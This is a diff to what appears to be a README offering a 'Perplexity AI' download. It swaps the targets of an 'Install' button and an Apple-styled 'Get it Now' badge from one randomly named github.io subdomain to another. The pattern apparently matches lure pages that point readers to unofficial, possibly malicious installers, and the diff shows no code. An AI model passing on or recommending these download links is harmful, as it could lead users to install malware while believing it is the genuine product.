@@ -6,7 +6,7 @@
 
 <div align="center">
 
-[![Install](https://i.postimg.cc/HWQSXqhp/68747470733a2f2f692e706f7374696d.png)](https://somovskoye.github.io/.github/perplexityAi)
+[![Install](https://i.postimg.cc/HWQSXqhp/68747470733a2f2f692e706f7374696d.png)](https://skalsd-oasd.github.io/.github/perplexityAi)
 
 </div>
 
@@ -81,7 +81,7 @@ Perplexity's citation model addresses the fundamental problem with using AI for 
 
 <p align="center">
 
-[![Get it Now Perplexity AI](https://img.shields.io/badge/Get_it_Now-0096C7?style=for-the-badge&logo=apple&logoColor=white)](https://somovskoye.github.io/.github/perplexityAi)
+[![Get it Now Perplexity AI](https://img.shields.io/badge/Get_it_Now-0096C7?style=for-the-badge&logo=apple&logoColor=white)](https://skalsd-oasd.github.io/.github/perplexityAi)
 
 </p>
 
